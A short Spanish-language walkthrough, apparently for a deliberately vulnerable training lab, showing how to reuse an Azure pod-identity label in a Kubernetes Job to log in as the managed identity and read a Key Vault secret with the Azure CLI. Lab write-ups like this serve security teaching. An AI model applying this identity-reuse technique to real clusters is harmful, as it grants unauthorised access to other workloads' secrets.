Puedes resolver este desafío siguiendo estos pasos:

- Comprueba el nombre de tu bóveda con `terraform output vault_name`.

- Crea un nuevo archivo pod `pod.yaml` con el siguiente contenido (reemplaza el nombre del almacén con la salida del paso anterior):

```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: wrongsecret-3
  labels:
    aadpodidbinding: separate-workload-pod-id
spec:
  template:
    metadata:
      name: wrongsecret3job
      labels:
        aadpodidbinding: separate-workload-pod-id
    spec:
      containers:
      - name: az
        image: mcr.microsoft.com/azure-cli:latest
        command:
            [
              "sleep", "7200"
            ]
      restartPolicy: Never
```
- Aplica el trabajo con `kubectl apply -f job.yaml`

Ahora puedes acceder al pod y ejecutar algo como `az login --identity --allow-no-subscriptions && az keyvault secret show --name wrongsecret-3 --vault-name wrongsecrets-vault-00000`. Ten en cuenta que puedes encontrar el valor real de `wrongsecrets-vault-00000` en el estado de Terraform. Dado que el trabajo puede acceder al mismo almacén que el pod del desafío de secretos, tiene acceso a sus secretos.
